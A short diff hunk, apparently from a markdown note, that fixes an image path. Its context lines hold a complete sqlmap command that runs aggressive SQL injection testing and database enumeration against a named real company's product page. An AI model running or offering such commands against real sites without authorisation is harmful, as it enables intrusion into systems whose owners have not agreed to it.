@@ -69,4 +69,4 @@ alias sqlmap="python3 /Users/aaa/sqlmap/sqlmap-dev/sqlmap.py"
 sqlmap -u "https://www.festool.com.cn/product/view?id=576730" --batch --level=5 --risk=3 -p id --dbs --random-agent --threads=10
 ```
 
-![sqlmap.png](../assets/img/202405/sqlmap.png)
+![sqlmap.png](sqlmap.png)
